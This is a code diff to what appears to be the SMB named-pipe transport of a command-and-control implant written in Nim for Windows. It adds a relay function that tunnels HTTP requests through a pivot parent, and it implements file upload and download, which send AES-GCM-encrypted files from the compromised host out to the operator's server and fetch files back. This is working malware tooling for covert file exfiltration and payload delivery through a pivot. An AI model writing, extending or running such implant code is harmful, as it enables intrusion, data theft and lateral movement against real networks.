@@ -3,8 +3,8 @@
 ##   each message is [4-byte LE length][JSON payload]
 ## The pivot parent (Go pipe_server_windows.go) handles AES and HTTP relay.
 import winim/lean
-import std/[json, base64, strutils]
-import config
+import std/[json, base64, strutils, uri]
+import config, crypto
 
 # WaitNamedPipeW is not always in winim/lean — declare explicitly
 proc WaitNamedPipeW(lpName: LPCWSTR, nTimeOut: DWORD): WINBOOL
@@ -179,10 +179,38 @@ proc sendResultAdmin*(t: var AgentTransport; taskId: int64;
   }
   pipeWriteMsg(t.pipe, cast[seq[byte]]($req))
 
+proc relayRequest(t: var AgentTransport; verb, path: string;
+                  body: seq[byte]): tuple[status: int, body: seq[byte]] =
+  let req = %*{
+    "type": "RELAY", "method": verb, "path": path,
+    "body_b64": base64.encode(cast[string](body))
+  }
+  pipeWriteMsg(t.pipe, cast[seq[byte]]($req))
+  let response = pipeReadMsg(t.pipe)
+  if response.len == 0: return (502, @[])
+  try:
+    let j = parseJson(cast[string](response))
+    result.status = j{"status"}.getInt(502)
+    result.body = cast[seq[byte]](base64.decode(j{"body_b64"}.getStr("")))
+  except:
+    result = (502, @[])
+
+proc smbExtractFilename(path: string): string =
+  let normalized = path.replace('\\', '/')
+  let i = normalized.rfind('/')
+  if i < 0: return normalized
+  if i == normalized.high: return ""
+  normalized[i + 1 .. ^1]
+
 proc uploadFile*(t: var AgentTransport; taskId: int64;
-                 filename: string; data: seq[byte]) =
-  # Not supported via pipe — acknowledge task
-  t.sendResult(taskId, "[!] uploadFile not supported over SMB pivot", "")
+                 filename: string; data: seq[byte]): bool =
+  let name = encodeUrl(smbExtractFilename(filename))
+  let response = t.relayRequest("POST", "/upload/" & t.agentId & "/" & name & "?task_id=" & $taskId,
+                                sealGCM(t.aesKey, data))
+  return response.status == 200
 
 proc downloadFile*(t: var AgentTransport; filename: string): seq[byte] =
-  return @[]
+  let name = encodeUrl(smbExtractFilename(filename))
+  let response = t.relayRequest("GET", "/dl/" & t.agentId & "/" & name, @[])
+  if response.status != 200 or response.body.len == 0: return @[]
+  return openGCM(t.aesKey, response.body)
